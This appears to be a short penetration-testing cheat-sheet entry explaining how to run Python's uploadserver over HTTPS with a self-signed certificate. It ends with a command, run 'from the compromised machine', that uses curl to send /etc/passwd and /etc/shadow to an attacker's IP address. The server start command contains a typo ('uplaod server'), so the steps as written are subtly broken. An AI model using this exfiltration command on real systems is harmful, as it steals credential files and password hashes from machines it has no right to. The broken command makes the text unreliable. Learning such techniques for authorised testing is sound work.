Python Uploadserver
####################

Description
*************

There is a python http server you can use for upload files.

This can be installed with:

.. code-block:: console

   sudo python -m pip install --user uploadserver

Create a SSL cert

.. code-block:: console

   openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

.. code-block:: console

   mkdir https && cd https

Start the server

.. code-block:: console

   sudo python3 -m uplaod server 443 --server-certificate ../server.pem

Then from the compromised machine you can send files needed:

.. code-block:: console

   Temen@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
